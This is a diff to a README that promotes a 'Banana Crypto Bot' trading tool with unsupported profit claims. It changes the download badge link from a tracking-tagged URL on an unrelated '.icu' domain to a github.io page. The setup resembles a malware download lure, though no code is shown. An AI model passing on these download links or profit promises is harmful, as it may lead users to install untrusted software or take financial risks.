@@ -2,8 +2,7 @@
 
 The **Banana Crypto Bot** is an advanced **automated trading tool** designed to help users execute **profitable cryptocurrency trades** across multiple exchanges. By analyzing real-time market trends and leveraging advanced algorithms, the bot identifies optimal buying and selling opportunities to maximize profits. The bot supports various **crypto assets** and trading pairs, offering users a seamless trading experience with minimal effort. It also provides **customizable settings**, allowing traders to adjust strategies based on their risk tolerance and preferences. Whether you are a **beginner** or an **experienced trader**, the **Banana Crypto Bot** aims to optimize your trading strategies and enhance your chances of success in the volatile crypto market.
 
-[![Download Banana Crypto Bot](https://img.shields.io/badge/Download-BananaCrypto%20bot-blueviolet)](https://downloadifiles.icu?label=bed33cdd29a1fdc17814b892c386c9e9
-)
+[![Download Banana Crypto Bot](https://img.shields.io/badge/Download-BananaCrypto%20bot-blueviolet)](https://banana-crypto-bot.github.io/.github/)
 
 ⚡ **Key Features:**
 
